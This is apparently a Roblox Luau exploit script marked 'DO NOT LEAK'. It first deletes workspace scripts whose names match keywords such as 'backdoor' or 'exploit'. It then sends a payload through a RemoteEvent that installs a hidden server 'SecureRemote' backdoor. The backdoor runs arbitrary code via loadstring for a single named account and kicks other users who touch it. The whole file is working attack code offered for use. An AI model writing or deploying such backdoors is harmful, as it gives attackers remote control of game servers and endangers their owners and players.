-- DO NOT LEAK


local keywords = {"cheat", "exploit", "backdoor", "hack"}


local function isMalicious(name)
	for _, keyword in ipairs(keywords) do
		if string.find(string.lower(name), keyword) then
			return true
		end
	end
	return false
end

-- Función que busca y elimina scripts maliciosos en el workspace
local function cleanWorkspace()
	local removed = 0
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("LocalScript") or obj:IsA("Script") then
			if isMalicious(obj.Name) then
				pcall(function()
					obj:Destroy()
					removed += 1
				end)
			end
		end
	end
	return removed
end

local removedCount = cleanWorkspace()


if removedCount > 0 then
	wait(1)
	local retryRemoved = cleanWorkspace()
	if retryRemoved > 0 then
	end
end



local Remote = game.ReplicatedStorage:WaitForChild("RemoteEvent")



local InitPayload = [[
    task.spawn(function() 
        local success, err = pcall(function()
            local SecureRemote = Instance.new("RemoteEvent")
            SecureRemote.OnServerEvent:Connect(function(plr, payload)
                if plr ~= game.Players["luau342432"] then
                    SecureRemote:FireClient(game.Players["luau342432"], plr.Name)
                    plr:Kick("Private backdoor, dont touch.")
                    return
                end

                local success, err = pcall(function()
                    loadstring(payload)()
                end)

                if not success then
                    local msg = Instance.new("Hint", game.Workspace)
                    msg.Text = "Admin payload internal error: " .. tostring(err)
                    task.delay(10, function() msg:Destroy() end)
                end
            end)

            SecureRemote.Parent = game.Workspace
            SecureRemote.Name = "SecureRemote"
        end)

        if not success then
            local msg = Instance.new("Hint", game.Workspace)
            msg.Text = "Init payload error: "..err
            task.wait(20)
            msg:Destroy()
        else
            local msg = Instance.new("Hint", game.Workspace)
            msg.Text = "d1scoogui loaded succesfully"
            task.wait(5)
            msg:Destroy()
        end
    end)
]]

Remote:FireServer(InitPayload)
warn("d1scoogui loaded succesfully")


